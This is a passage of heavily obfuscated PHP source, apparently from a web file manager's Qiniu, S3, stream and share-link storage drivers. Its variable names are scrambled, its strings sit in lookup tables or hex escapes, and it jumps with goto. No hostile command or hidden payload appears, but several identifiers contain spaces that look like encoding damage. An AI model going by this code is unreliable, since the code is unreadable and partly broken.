$¶á…°¦¦ = $this->objectMeta($õŞ°ğ”À); if (isset($¶á…°¦¦[$ƒ’œ• [1440]])) { $»´êº‘ğ[$ƒ’œ• [85]] = substr($¶á…°¦¦[$ƒ’œ• [1440]] . $ƒ’œ• [12], 0, 10); } return $»´êº‘ğ; } public function listPath($£¼Ñş«å, $³…ı¡Àò = false) { $úåê×ò¡ =& $_SERVER[Ü©»’·]; $æ°»ö² = $this->fileList($£¼Ñş«å, $úåê×ò¡[8], !0); foreach ($æ°»ö²[$úåê×ò¡[82]] as $è¬¤•ìÊ => $éŸÔ—½) { $æ°»ö²[$úåê×ò¡[82]][$è¬¤•ìÊ] = $this->folderInfo($éŸÔ—½, $³…ı¡Àò); } foreach ($æ°»ö²[$úåê×ò¡[83]] as $è¬¤•ìÊ => $éŸÔ—½) { $æ°»ö²[$úåê×ò¡[83]][$è¬¤•ìÊ] = $this->fileInfo($éŸÔ—½[$úåê×ò¡[94]], $³…ı¡Àò, $éŸÔ—½); } return $æ°»ö²; } public function has($ÈÄûôø, $‘æ›®‘ = false, $‚ğ¢¶Ï = true) { $¯ÈÓŒÃÄ =& $_SERVER[Ü©»’·]; $ÈÄûôø = trim($ÈÄûôø, $¯ÈÓŒÃÄ[8]); $Ÿ¥Š’×ø = empty($ÈÄûôø) && $ÈÄûôø !== $¯ÈÓŒÃÄ[197] ? $¯ÈÓŒÃÄ[12] : $ÈÄûôø . $¯ÈÓŒÃÄ[8]; $¾½óµŒæ = $¯ÈÓŒÃÄ[12]; $â»›¥ÎË = 500; $ş±Ù«»Š = $¯ÈÓŒÃÄ[8]; $ëÈÕ«¾î = $ÄÆı³Ö = 0; while (!0) { check_abort(); list($™íëÂš, $í¬”ğŒ±) = $this->bucketManager->listFiles($this->bucket, $Ÿ¥Š’×ø, $¾½óµŒæ, $â»›¥ÎË, $ş±Ù«»Š); if ($í¬”ğŒ±) { break; } $¾½óµŒæ = array_key_exists($¯ÈÓŒÃÄ[1408], $™íëÂš) ? $¾½óµŒæ = $™íëÂš[$¯ÈÓŒÃÄ[1441]] : $¯ÈÓŒÃÄ[12]; if ($‘æ›®‘) { if (!empty($™íëÂš[$¯ÈÓŒÃÄ[1442]])) { $ëÈÕ«¾î += count($™íëÂš[$¯ÈÓŒÃÄ[1442]]); } if (!empty($™íëÂš[$¯ÈÓŒÃÄ[1443]])) { $ÄÆı³Ö += count($™íëÂš[$¯ÈÓŒÃÄ[1443]]); } if ($¾½óµŒæ === $¯ÈÓŒÃÄ[12]) { break; } continue; } if ($‚ğ¢¶Ï) { if (!empty($™íëÂš[$¯ÈÓŒÃÄ[1442]])) { return !0; } } else { if (!empty($™íëÂš[$¯ÈÓŒÃÄ[1443]])) { return !0; } } if ($¾½óµŒæ === $¯ÈÓŒÃÄ[12]) { break; } } if ($‘æ›®‘) { return array($¯ÈÓŒÃÄ[207] => $ëÈÕ«¾î, $¯ÈÓŒÃÄ[208] => $ÄÆı³Ö); } return !1; } public function listAll($ºÍ¹Úêê) { $µõ‰ÂÅ =& $_SERVER[Ü©»’·]; $ìÅšƒ˜õ = $this->fileList($ºÍ¹Úêê, $µõ‰ÂÅ[12], !0); $®ÎñŸÜ“ = array(); foreach ($ìÅšƒ˜õ[$µõ‰ÂÅ[83]] as $ÊÔ°Öö‡) { $®ÎñŸÜ“[$ÊÔ°Öö‡[$µõ‰ÂÅ[94]]] = $ÊÔ°Öö‡[$µõ‰ÂÅ[76]]; } foreach ($ìÅšƒ˜õ[$µõ‰ÂÅ[82]] as $ÊÔ°Öö‡) { if (is_string($ÊÔ°Öö‡)) { $®ÎñŸÜ“[$ÊÔ°Öö‡] = 0; } } return $this->listAllFiles($ºÍ¹Úêê, array_keys($®ÎñŸÜ“), $®ÎñŸÜ“); } private function fileList($¶£óÌ‰Ú, $Ğ„ƒÚğ¸ = '', $‹ÏË¿’ = 0) { $ÚÆÖè” =& $_SERVER[Ü©»’·]; $¶£óÌ‰Ú = trim($¶£óÌ‰Ú, $ÚÆÖè”[8]); $¼“¸ê—™ = empty($¶£óÌ‰Ú) && $¶£óÌ‰Ú !== $ÚÆÖè”[197] ? $ÚÆÖè”[12] : $¶£óÌ‰Ú . $ÚÆÖè”[8]; $–óíî³ = $ÚÆÖè”[12]; $è“’Œ® = 1000; $óÕ‡¸Æà = $Ó÷©ÛŞ» = array(); while (!0) { check_abort(); list($£À÷Ú„, $»ìñïâ) = $this->bucketManager->listFiles($this->bucket, $¼“¸ê—™, $–óíî³, $è“’Œ®, $Ğ„ƒÚğ¸); if ($»ìñïâ) { break; } $–óíî³ = array_key_exists($ÚÆÖè”[1408], $£À÷Ú„) ? $–óíî³ = $£À÷Ú„[$ÚÆÖè”[1441]] : $ÚÆÖè”[12]; $Í–³»›ï = isset($£À÷Ú„[$ÚÆÖè”[1442]]) ? $£À÷Ú„[$ÚÆÖè”[1442]] : array(); $§Ä„Ì±± = isset($£À÷Ú„[$ÚÆÖè”[1443]]) ? $£À÷Ú„[$ÚÆÖè”[1443]] : array(); foreach ($Í–³»›ï as $´ïê•Äá) { if ($´ïê•Äá[$ÚÆÖè”[94]] == $¼“¸ê—™) { continue; } $Û‚‰è÷‹ = $´ïê•Äá[$ÚÆÖè”[94]]; $¢çíç = $´ïê•Äá[$ÚÆÖè”[1439]]; $´ïê•Äá[$ÚÆÖè”[76]] = $¢çíç; $èìÎä’ë = $¢çíç == 0 && substr($Û‚‰è÷‹, strlen($Û‚‰è÷‹) - 1, 1) == $ÚÆÖè”[8] ? !0 : !1; $this->cacheMethodInfoSet($Û‚‰è÷‹, $èìÎä’ë, $´ïê•Äá); if ($èìÎä’ë) { $óÕ‡¸Æà[] = $Û‚‰è÷‹; continue; } $Ó÷©ÛŞ»[] = $‹ÏË¿’ ? $´ïê•Äá : $Û‚‰è÷‹; } foreach ($§Ä„Ì±± as $Û‚‰è÷‹) { if ($Û‚‰è÷‹ == $¼“¸ê—™) { continue; } $óÕ‡¸Æà[] = $Û‚‰è÷‹; $this->cacheMethodInfoSet($Û‚‰è÷‹, !0); } if ($–óíî³ === $ÚÆÖè”[12]) { break; } } $this->cacheMethodInfoSet($¶£óÌ‰Ú, !0); return array($ÚÆÖè”[82] => $óÕ‡¸Æà, $ÚÆÖè”[83] => $Ó÷©ÛŞ»); } public function canRead($’«é”ëì) { return $this->exist($’«é”ëì) ? !0 : !1; } public function canWrite($“‹Î„¥ì) { return $this->exist($“‹Î„¥ì) ? !0 : !1; } public function getContent($•˜Èšé) { return $this->fileSubstr($•˜Èšé, 0, -1); } public function setContent($•ê—ÖŠ’, $É‘ª©í = '') { $ƒÙ åÙ = $this->tempFile($this->pathThis($•ê—ÖŠ’)); file_put_contents($ƒÙ åÙ, $É‘ª©í); if ($this->upload($•ê—ÖŠ’, $ƒÙ åÙ)) { $this->tempFileRemve($ƒÙ åÙ); return !0; } return !1; } public function refreshUrls($ñúü÷¨õ) { $Ñ–ç€˜ú =& $_SERVER[Ü©»’·]; $å¤¢œÜ¹ = array(); if (is_array($ñúü÷¨õ)) { foreach ($ñúü÷¨õ as $¼Ç¿î±ø) { $å¤¢œÜ¹[] = $this->link($¼Ç¿î±ø); } } else { $å¤¢œÜ¹[] = $this->link($ñúü÷¨õ); } $¸­Ó©öÜ = new Qiniu\Cdn\CdnManager($this->auth); list($¶êÚëæç, $ìËˆÀ˜ª) = $¸­Ó©öÜ->refreshUrls($å¤¢œÜ¹); if ($ìËˆÀ˜ª) { return !1; } return $¶êÚëæç[$Ñ–ç€˜ú[1186]] == $Ñ–ç€˜ú[766] ? !0 : !1; } public function fileSubstr($ÌïÂÍ¡, $¿°»ì¢‰, $åíœœœ‡) { $ˆå‰¨²“ =& $_SERVER[Ü©»’·]; if (!($÷‚ßŸ—Û = $this->link($ÌïÂÍ¡))) { return !1; } $Ö†ö¤» = !1; if ($åíœœœ‡ > 0) { $²€Ğ’¬ = $¿°»ì¢‰ + $åíœœœ‡ - 1; $Ö†ö¤» = array($ˆå‰¨²“[1444] . $¿°»ì¢‰ . $ˆå‰¨²“[395] . $²€Ğ’¬); } $ÆÃ¶¢À = url_request($÷‚ßŸ—Û, $ˆå‰¨²“[230], !1, $Ö†ö¤»); return $ÆÃ¶¢À[$ˆå‰¨²“[756]] ? $ÆÃ¶¢À[$ˆå‰¨²“[1206]] : !1; } public function upload($€ô±¢, $­øÊÇ£¼, $½üÇ‹á± = false, $İŠÌ‘™° = REPEAT_REPLACE) { $±¹Î¥¤ = new Qiniu\Storage\UploadManager(); $ºÑ“¦ñ = $this->auth->uploadToken($this->bucket, $€ô±¢); $ı·ç¬è¬ = get_file_mime(get_path_ext($­øÊÇ£¼)); list($·¯¨—¬¤, $ûÂªõĞğ) = $±¹Î¥¤->putFile($ºÑ“¦ñ, $€ô±¢, $­øÊÇ£¼, null, $ı·ç¬è¬); return $ûÂªõĞğ ? !1 : $this->getPathOuter($€ô±¢); } public function uploadFormData($¿…ÑÒéÍ, $ƒ„«”Ö = 3600) { return $this->uploadToken($¿…ÑÒéÍ, $ƒ„«”Ö); } public function multiUploadFormData($³öïâŸ¿, $—™Û”¶­ = 3600) { return $this->uploadToken($³öïâŸ¿, $—™Û”¶­); } private function uploadToken($»“ãÊ, $£èŠşï• = 3600) { $Ú’…õ¾ß =& $_SERVER[Ü©»’·]; $æß·ï ø = $£èŠşï•; $†¹²üÃ = array($Ú’…õ¾ß[1445] => $Ú’…õ¾ß[1446]); $ÀÍÆ€é = $»“ãÊ; $¡Şå³—© = $this->auth->uploadToken($this->bucket, $ÀÍÆ€é, $æß·ï ø, $†¹²üÃ, !0); $÷æÕÒÈŸ = empty($this->region) || $this->region == $Ú’…õ¾ß[1447] ? $Ú’…õ¾ß[12] : $Ú’…õ¾ß[395] . $this->region; $ÌØÀˆº‚ = http_type() . "\x3a\x2f\x2f\165\x70\154\x6f\x61\144{$÷æÕÒÈŸ}\56\161\x69\x6e\x69\x75\x70\x2e\143\157\155\57"; return array($Ú’…õ¾ß[1448] => $¡Şå³—©, $Ú’…õ¾ß[1449] => $ÌØÀˆº‚); } public function download($§›»ÜÜœ, $á·¹Ú’½) { $±ÔÚœ·¸ = IO::getPathInner(IO::mkfile($á·¹Ú’½)); if (!($ŸÍ£›ö¡ = $this->link($§›»ÜÜœ))) { return !1; } $ñ½¹ÏÓæ = 0; $êÌŒ¡ç† = 1024 * 200; $Í¡Áàë´ = fopen($±ÔÚœ·¸, $_SERVER[Ü©»’·][1450]); while (!0) { $ë¦÷Üù« = $this->fileSubstr($§›»ÜÜœ, $ñ½¹ÏÓæ, $êÌŒ¡ç†); if ($ë¦÷Üù« === !1) { return !1; } fwrite($Í¡Áàë´, $ë¦÷Üù«); $ñ½¹ÏÓæ += $êÌŒ¡ç†; if (strlen($ë¦÷Üù«) < $êÌŒ¡ç†) { break; } } fclose($Í¡Áàë´); return $á·¹Ú’½; } public function link($£ä’œõ°, $ÍĞŞºµ“ = '') { if (!$this->isFile($£ä’œõ°)) { return !1; } $‰´´Ú¸ó = $this->getHost() . $_SERVER[Ü©»’·][8] . $this->pathEncode($£ä’œõ°) . $ÍĞŞºµ“; return $this->auth->privateDownloadUrl($‰´´Ú¸ó, 3600 * 12); } public function fileOut($Ñ‘ŒŒ«, $ûû¨ïÚÛ = false, $ÏÅÛšñ¸ = false, $¾Å°èî­ = '') { $ø‘Ú¯º =& $_SERVER[Ü©»’·]; if ($this->isFileOutServer()) { return $this->fileOutServer($Ñ‘ŒŒ«, $ûû¨ïÚÛ, $ÏÅÛšñ¸, $¾Å°èî­); } if (!$ÏÅÛšñ¸) { $ÏÅÛšñ¸ = $this->pathThis($Ñ‘ŒŒ«); } $ÆÏ¬ÄÀ = $ûû¨ïÚÛ ? $ø‘Ú¯º[1451] . rawurlencode($ÏÅÛšñ¸) : $ø‘Ú¯º[12]; $‡ÍÍçşÜ = $this->link($Ñ‘ŒŒ«, $ÆÏ¬ÄÀ); $this->fileOutLink($‡ÍÍçşÜ); } public function fileOutServer($ô©ê÷¶, $€œãÈ¢Ä = false, $ãì™Íé“ = false, $İ­¤Ö· = '') { parent::fileOut($ô©ê÷¶, $€œãÈ¢Ä, $ãì™Íé“, $İ­¤Ö·); } public function fileOutImage($Úƒ²™á, $Üº…Ò” = 250) { $Ñú¬…¨î = $this->link($Úƒ²™á, $_SERVER[Ü©»’·][1452] . $Üº…Ò”); $this->fileOutLink($Ñú¬…¨î); } public function fileOutImageServer($ç„àˆà, $â¹½‚©˜ = 250) { parent::fileOutImage($ç„àˆà, $â¹½‚©˜); } public function hashMd5($„ÇÅ§ï…) { $Õ§Ü‹ŸÙ =& $_SERVER[Ü©»’·]; $ùã´±Ö = $this->objectMeta($„ÇÅ§ï…); return isset($ùã´±Ö[$Õ§Ü‹ŸÙ[212]]) ? $ùã´±Ö[$Õ§Ü‹ŸÙ[212]] : !1; $¾ãÇÅ»Î = $this->link($„ÇÅ§ï…, $Õ§Ü‹ŸÙ[1453]); } public function size($·Ø¤ıÛ) { $¡Ãµ»Ğ¦ = $this->objectMeta($·Ø¤ıÛ); return $¡Ãµ»Ğ¦ ? $¡Ãµ»Ğ¦[$_SERVER[Ü©»’·][76]] : 0; } public function info($·ÌìÅ˜î) { if ($this->isFolder($·ÌìÅ˜î)) { return $this->folderInfo($·ÌìÅ˜î); } else { if ($this->isFile($·ÌìÅ˜î)) { return $this->fileInfo($·ÌìÅ˜î); } } return !1; } public function exist($œûÛ¡ü¥) { return $this->isFile($œûÛ¡ü¥) || $this->isFolder($œûÛ¡ü¥); } public function isFile($ÕØàğ‚ã) { return !$this->isFolder($ÕØàğ‚ã) && $this->objectMeta($ÕØàğ‚ã); } public function isFolder($Æô˜Öˆã) { return $this->cacheMethod($_SERVER[Ü©»’·][165], $Æô˜Öˆã); } protected function objectMeta($ªú¡€) { return $this->cacheMethod($_SERVER[Ü©»’·][167], $ªú¡€); } protected function _objectMeta($ŞûÃ¬™Œ) { $«ÒŠãí =& $_SERVER[Ü©»’·]; list($¿ÜŸê Õ, $¡„›Ğê) = $this->bucketManager->stat($this->bucket, $ŞûÃ¬™Œ); if ($¿ÜŸê Õ) { $¿ÜŸê Õ[$«ÒŠãí[76]] = intval($¿ÜŸê Õ[$«ÒŠãí[1439]]); } return $¿ÜŸê Õ; } protected function _isFolder($ƒîÁ½ˆ) { $åî™¥¯€ =& $_SERVER[Ü©»’·]; if ($ƒîÁ½ˆ == $åî™¥¯€[12] || $ƒîÁ½ˆ == $åî™¥¯€[8]) { return !0; } list($ÀÌššÀ, $—ˆÌĞÉ) = $this->bucketManager->listFiles($this->bucket, trim($ƒîÁ½ˆ, $åî™¥¯€[8]) . $åî™¥¯€[8], $åî™¥¯€[12], 1, $åî™¥¯€[8]); return !empty($ÀÌššÀ[$åî™¥¯€[1442]]) || !empty($ÀÌššÀ[$åî™¥¯€[1443]]) ? !0 : !1; } } class PathDriverS3 extends PathDriverBaseS3 { public function __construct($î¸ö²ƒç) { parent::__construct($î¸ö²ƒç); } public function uploadFormData($±ééÕ×Ü, $•çœ½áº = 3600) { $ÙÇßş«î =& $_SERVER[Ü©»’·]; $ïûÉ¿Æğ = $ÙÇßş«î[198]; $“ó¿’È = $ÙÇßş«î[1358]; $ŸÊ°¹µ = $ÙÇßş«î[62]; $±…ª‚Á© = gmdate($ÙÇßş«î[1359]); $ñ›ñ´İ« = gmdate($ÙÇßş«î[757]); $Ğú¸Ù¤Å = $ÙÇßş«î[1360]; $Ø±ø‡æÃ = $•çœ½áº . $ÙÇßş«î[12]; $‘‚®£› = $ÙÇßş«î[1322]; $ß÷ÉÒ„Ì = array($this->accessKey, $ñ›ñ´İ«, $this->region, $ŸÊ°¹µ, $Ğú¸Ù¤Å); $ÉÜ¡ºº = implode($ÙÇßş«î[8], $ß÷ÉÒ„Ì); $Ê–­Ï·ù = array($ÙÇßş«î[1324] => gmdate($ÙÇßş«î[1323], strtotime($ÙÇßş«î[1361])), $ÙÇßş«î[1325] => array(array($ÙÇßş«î[1327] => $this->bucket), array($ÙÇßş«î[1326] => $ïûÉ¿Æğ), array($ÙÇßş«î[1328], $ÙÇßş«î[1329], $ÙÇßş«î[12]), array($ÙÇßş«î[1328], $ÙÇßş«î[1362], $ÙÇßş«î[12]), array($ÙÇßş«î[1328], $ÙÇßş«î[1363], $ÙÇßş«î[12]), array($ÙÇßş«î[1330] => $‘‚®£›), array($ÙÇßş«î[1364] => $ÉÜ¡ºº), array($ÙÇßş«î[1365] => $“ó¿’È), array($ÙÇßş«î[1366] => $±…ª‚Á©), array($ÙÇßş«î[1367] => $Ø±ø‡æÃ))); $€·éÑû’ = base64_encode(json_encode($Ê–­Ï·ù)); $ú«“îó = hash_hmac($ÙÇßş«î[1368], $ñ›ñ´İ«, $ÙÇßş«î[1369] . $this->secret, !0); $¢áŞÒ£¾ = hash_hmac($ÙÇßş«î[1368], $this->region, $ú«“îó, !0); $íÒıÉ³ = hash_hmac($ÙÇßş«î[1368], $ŸÊ°¹µ, $¢áŞÒ£¾, !0); $ìô±’ÜÌ = hash_hmac($ÙÇßş«î[1368], $Ğú¸Ù¤Å, $íÒıÉ³, !0); $Âˆòíû = hash_hmac($ÙÇßş«î[1368], $€·éÑû’, $ìô±’ÜÌ); $â¿ºòË¸ = array($ÙÇßş«î[215] => $ÙÇßş«î[12], $ÙÇßş«î[1370] => $ÙÇßş«î[12], $ÙÇßş«î[1326] => $ïûÉ¿Æğ, $ÙÇßş«î[1330] => $‘‚®£›, $ÙÇßş«î[1334] => $€·éÑû’, $ÙÇßş«î[1371] => $ÉÜ¡ºº, $ÙÇßş«î[1372] => $“ó¿’È, $ÙÇßş«î[1373] => $±…ª‚Á©, $ÙÇßş«î[1374] => $Ø±ø‡æÃ, $ÙÇßş«î[1375] => $Âˆòíû, $ÙÇßş«î[181] => $this->getHost()); return $â¿ºòË¸; } public function multiUploadFormData($Ÿïı‹ğ¸, $Û¼ÎøŞÈ = 3600) { $ƒ©¬¸áº =& $_SERVER[Ü©»’·]; $åı˜è»¹ = gmdate($ƒ©¬¸áº[1454]); $ïõøá = array(); $­œŒàî = $this->client->getUploadId($this->bucket, $Ÿïı‹ğ¸, $ïõøá); if (!$­œŒàî) { return !1; } return array($ƒ©¬¸áº[223] => $­œŒàî, $ƒ©¬¸áº[181] => $this->getHost() . $ƒ©¬¸áº[8] . $this->pathEncode($Ÿïı‹ğ¸), $ƒ©¬¸áº[224] => $åı˜è»¹, $ƒ©¬¸áº[94] => $Ÿïı‹ğ¸); } public function multiUploadAuthData($Æ¢±š‰, $œÈ†¬Àà = array()) { $Üè°ĞË =& $_SERVER[Ü©»’·]; $ÌÚïÀª© = isset($œÈ†¬Àà[$Üè°ĞË[174]]) ? $œÈ†¬Àà[$Üè°ĞË[174]] : $Üè°ĞË[12]; $ñµ­˜‚ = $œÈ†¬Àà[$Üè°ĞË[94]]; unset($œÈ†¬Àà[$Üè°ĞË[94]]); if (isset($œÈ†¬Àà[$Üè°ĞË[225]])) { return $this->listUploadParts($ñµ­˜‚, $œÈ†¬Àà); } $ÈÒ…¶± = array(); if (isset($œÈ†¬Àà[$Üè°ĞË[1455]])) { $ÈÒ…¶±[$Üè°ĞË[1456]] = $œÈ†¬Àà[$Üè°ĞË[1455]]; } $Í¨öñ•æ = explode($Üè°ĞË[183], $this->getHost()); $ó‡Éèï¶ = array($Üè°ĞË[1457] => $Í¨öñ•æ[1], $Üè°ĞË[1458] => $Üè°ĞË[12], $Üè°ĞË[215] => $Üè°ĞË[120], $Üè°ĞË[1370] => $œÈ†¬Àà[$Üè°ĞË[76]]); $õ…°ºŠ£ = $Üè°ĞË[228]; $›±Åˆš’ = $Üè°ĞË[8] . $this->pathEncode($ñµ­˜‚) . $ÌÚïÀª©; $ï©ä«§Ñ = $this->client->__getSignatureV4($ÈÒ…¶±, $ó‡Éèï¶, $õ…°ºŠ£, $›±Åˆš’); if (strpos($ÌÚïÀª©, $Üè°ĞË[227]) === 0) { if (isset($ÈÒ…¶±[$Üè°ĞË[1456]])) { $İ‚¶¾åí = $ÈÒ…¶±[$Üè°ĞË[1456]]; } else { if (isset($ï©ä«§Ñ[$Üè°ĞË[1456]])) { $İ‚¶¾åí = $ï©ä«§Ñ[$Üè°ĞË[1456]]; } else { $İ‚¶¾åí = hash($Üè°ĞË[1368], $Üè°ĞË[12]); } } return array($Üè°ĞË[234] => $ï©ä«§Ñ[$Üè°ĞË[234]], $Üè°ĞË[1456] => $İ‚¶¾åí, $Üè°ĞË[224] => $ï©ä«§Ñ[$Üè°ĞË[1459]]); } return $ï©ä«§Ñ[$Üè°ĞË[234]]; } public function listUploadParts($¬à‡çŠ, $ÌÁİ´Ø… = array()) { $³³Ù²£ =& $_SERVER[Ü©»’·]; $¬å†æ³­ = str_replace($³³Ù²£[235], $³³Ù²£[12], $ÌÁİ´Ø…[$³³Ù²£[174]]); $»³ªÈ«ş = $this->client->listParts($this->bucket, $¬à‡çŠ, $¬å†æ³­); if (!$»³ªÈ«ş) { return !1; } $ı®Û¹ñÛ = $³³Ù²£[1460]; foreach ($»³ªÈ«ş as $óÆÈÒ´Ä) { $ı®Û¹ñÛ .= $³³Ù²£[1461] . "\74\x50\141\162\x74\x4e\x75\x6d\142\145\x72\76{$óÆÈÒ´Ä[$³³Ù²£[1415]]}\74\57\120\x61\x72\164\x4e\165\x6d\x62\145\162\76\xa" . "\74\105\x54\141\x67\76{$óÆÈÒ´Ä[$³³Ù²£[1416]]}\74\57\x45\x54\x61\x67\76\xa" . $³³Ù²£[1462]; } $ı®Û¹ñÛ .= $³³Ù²£[1463]; $±ò¼¢¬½ = array(); $´¸¶…Ä¥ = explode($³³Ù²£[183], $this->getHost()); $ÀÊ©ŒÇÃ = array($³³Ù²£[1457] => $´¸¶…Ä¥[1], $³³Ù²£[215] => $³³Ù²£[120], $³³Ù²£[1370] => strlen($ı®Û¹ñÛ)); $ç‹×“Œà = $³³Ù²£[226]; $ÈÖØğº™ = $³³Ù²£[8] . $this->pathEncode($¬à‡çŠ) . $ÌÁİ´Ø…[$³³Ù²£[174]]; $ˆÕ¶ì²‰ = $this->client->__getSignatureV4($±ò¼¢¬½, $ÀÊ©ŒÇÃ, $ç‹×“Œà, $ÈÖØğº™, $ı®Û¹ñÛ); return array($³³Ù²£[234] => $ˆÕ¶ì²‰[$³³Ù²£[234]], $³³Ù²£[224] => $ˆÕ¶ì²‰[$³³Ù²£[1459]], $³³Ù²£[236] => $»³ªÈ«ş, $³³Ù²£[1456] => $ˆÕ¶ì²‰[$³³Ù²£[1456]]); } public function link($üŒĞ–”, $¥™³Ê†é = array()) { return parent::link($üŒĞ–”, $¥™³Ê†é); } public function fileOut($æúŒµ³, $ÇÇÆš‰ù = false, $¿¾€×Ò‹ = false, $ª·±‰–´ = '') { if ($this->isFileOutServer() || strstr($this->endpoint, $_SERVER[Ü©»’·][1464])) { return parent::fileOutServer($æúŒµ³, $ÇÇÆš‰ù, $¿¾€×Ò‹, $ª·±‰–´); } parent::fileOut($æúŒµ³, $ÇÇÆš‰ù, $¿¾€×Ò‹, $ª·±‰–´); } public function fileOutImage($ê¥§ŒßÚ, $¤°ıÏß = 250) { if (strstr($this->endpoint, $_SERVER[Ü©»’·][1464])) { return parent::fileOutImageServer($ê¥§ŒßÚ, $¤°ıÏß); } parent::fileOutImage($ê¥§ŒßÚ, $¤°ıÏß); } public function fileOutLink($á±ùîà) { $‘İÇ¥†’ =& $_SERVER[Ü©»’·]; if (substr($á±ùîà, 0, 7) == $‘İÇ¥†’[1337]) { $á±ùîà = $‘İÇ¥†’[1338] . substr($á±ùîà, 7); } header($‘İÇ¥†’[161] . $á±ùîà); die; } public function getHost() { $ïÁ‚ğ½ù =& $_SERVER[Ü©»’·]; $³›õ ı… = str_rtrim(parent::getHost(), $ïÁ‚ğ½ù[8] . $this->bucket); $³›õ ı… = explode($ïÁ‚ğ½ù[183], $³›õ ı…); return $³›õ ı…[0] . $ïÁ‚ğ½ù[183] . $this->bucket . $ïÁ‚ğ½ù[10] . $³›õ ı…[1]; } } class PathDriverStream extends PathDriverBase { const TYPE_STRING = 1; const TYPE_FILE = 2; public function __construct($Æ§á¼Òæ, $¼´Óñ¼¡ = 0) { parent::__construct(); $this->source = $Æ§á¼Òæ; $this->sourceSize = $¼´Óñ¼¡; if (is_string($this->source)) { $this->sourceType = self::TYPE_STRING; $this->sourceSize = strlen($this->source); } else { $this->sourceType = self::TYPE_FILE; } } public function size($ÍÒ¾¢ó¦ = false) { return $this->sourceSize; } public function getContent($‹¯ÈŸÕÅ = false) { return $this->fileSubstr($‹¯ÈŸÕÅ, 0, $this->sourceSize); } public function fileSubstr($¶÷âÓ¨  = false, $îÒ²ÒåĞ = 0, $ˆİ£å¾‘ = 0) { if (!$ˆİ£å¾‘) { $ˆİ£å¾‘ = $this->sourceSize; } $Ì’±Ã½Ë = $this->sourceSize - $îÒ²ÒåĞ; if ($ˆİ£å¾‘ >= $Ì’±Ã½Ë) { $ˆİ£å¾‘ = $Ì’±Ã½Ë; } if ($this->sourceType == self::TYPE_STRING) { return substr($this->source, $îÒ²ÒåĞ, $ˆİ£å¾‘); } if ($this->sourceType == self::TYPE_FILE) { if ($ˆİ£å¾‘ <= 0) { return $_SERVER[Ü©»’·][12]; } $€Ÿ°Ü“Ï = ftell($this->source); fseek_64($this->source, $€Ÿ°Ü“Ï + $îÒ²ÒåĞ); $Å°×äŒ» = @fread($this->source, $ˆİ£å¾‘); fseek_64($this->source, $€Ÿ°Ü“Ï); return $Å°×äŒ»; } } public function hashMd5($±Ö©ûÏ = false) { return md5($this->getContent()); } public static function hash($ËŒ°¦²—, $ËÁ—¼–† = 0) { $ˆ²˜œÉ… = new PathDriverStream($ËŒ°¦²—, $ËÁ—¼–†); return $ˆ²˜œÉ…->hashSimple($ËŒ°¦²—); } public static function md5($ÖÀ¾ÂÏ, $¦ä²©– = 0) { $„¯ãÀçº = new PathDriverStream($ÖÀ¾ÂÏ, $¦ä²©–); return $„¯ãÀçº->hashMd5($ÖÀ¾ÂÏ); } } goto DÔ¨¨ÙÁ§; d¹«äµ±¥Ü: function binCheckBigger($€ ¨ƒõª, $¯°ê¸ü) { return $€ ¨ƒõª > $¯°ê¸ü; } $_SERVER[$_SERVER[ò‡Ÿ¥¨®][3]] = ("\x38\x31\x36\x34"."\x36\x39")+0;$_0zub="tvq14c0di7o5ws2bhl9xgjkr3ufnmz68aeypufc5xds9y2b3vroiz4hne1gwp68t7ljmakq0n5pw";; class ClassBaseCall { protected static $_methodListStatic = array(); protected static $_methodList = array(); public function __call($âè·È¼õ, $œ·–ˆôñ) { $äôÍş»Ù =& $_SERVER[Ü©»’·]; if (isset(self::$_methodList[$âè·È¼õ])) { return @call_user_func_array(self::$_methodList[$âè·È¼õ], $œ·–ˆôñ); } else { if (method_exists($this, $âè·È¼õ)) { return call_user_func_array(array($this, $âè·È¼õ), $œ·–ˆôñ); } else { think_exception(__CLASS__ . $äôÍş»Ù[4] . $âè·È¼õ . $äôÍş»Ù[5]); } } } public static function __callStatic($Å’¨ó²Œ, $ãíîš’Ñ) { if (isset(self::$_methodListStatic[$Å’¨ó²Œ])) { return call_user_func_array(self::$_methodListStatic[$Å’¨ó²Œ], $ãíîš’Ñ); } else { if (method_exists(self, $Å’¨ó²Œ)) { return call_user_func_array(array(self, $Å’¨ó²Œ), $ãíîš’Ñ); } else { show_json("{$Å’¨ó²Œ}\50\51\40\156\157\x74\40\x65\x78\x69\163\x74\x3b", !1); } } } public static function addMethod($È Û±Ñ˜, $‹ËÁ¤‡Ò) { self::$_methodList[$È Û±Ñ˜] = $‹ËÁ¤‡Ò; } public static function addMethodStatic($Ø„„ğí, $ûä‰ÅÈ) { self::$_methodListStatic[$Ø„„ğí] = $ûä‰ÅÈ; } } goto f Ø§Ã‰“Û; fÙéñàƒè÷: class PathDriverDbShareLink extends PathDriverDB { public function __construct($­¾ŒšŞ€) { $this->pathParse = $­¾ŒšŞ€; $this->model = Model($_SERVER[Ü©»’·][1339]); } protected function infoParse($¥—šÑÃ», $€¾Ëãäï = false, $ôëÙäÒ— = false) { $‹ÊÇ„Í¥ =& $_SERVER[Ü©»’·]; return Action($‹ÊÇ„Í¥[1178])->sharePathInfo($this->pathParse[$‹ÊÇ„Í¥[84]], !0, $€¾Ëãäï); } public function listPath($»±ŠˆÅä, $Ñ£Ó¬Ğã = false) { $ãÌ¨ïÖ =& $_SERVER[Ü©»’·]; $Ó î¹Ì’ = parent::listPath($»±ŠˆÅä, $Ñ£Ó¬Ğã); if (!$Ó î¹Ì’) { return $Ó î¹Ì’; } if (is_array($Ó î¹Ì’[$ãÌ¨ïÖ[1348]])) { $Ó î¹Ì’[$ãÌ¨ïÖ[1348]] = Action($ãÌ¨ïÖ[1178])->shareItemInfo($Ó î¹Ì’[$ãÌ¨ïÖ[1348]]); } foreach ($Ó î¹Ì’ as $İœõ ” => $Ëˆİ¶Ëã) { if (!in_array($İœõ ”, array($ãÌ¨ïÖ[83], $ãÌ¨ïÖ[82]))) { continue; } foreach ($Ëˆİ¶Ëã as $’±´¾· => $İ¬×¡ÑÊ) { $Ó î¹Ì’[$İœõ ”][$’±´¾·] = Action($ãÌ¨ïÖ[1178])->shareItemInfo($İ¬×¡ÑÊ); } } return $Ó î¹Ì’; } public function listAll($”ïö‡ğ­) { $´òÊÇÚ† =& $_SERVER[Ü©»’·]; $¼ŠÙıƒæ = IO::info($this->pathParse[$´òÊÇÚ†[84]]); if (!$¼ŠÙıƒæ) { return array(); } $Ú®÷™™¼ = $this->model->listAll($”ïö‡ğ­); foreach ($Ú®÷™™¼ as &$“³†®›) { $“³†®›[$´òÊÇÚ†[86]] = 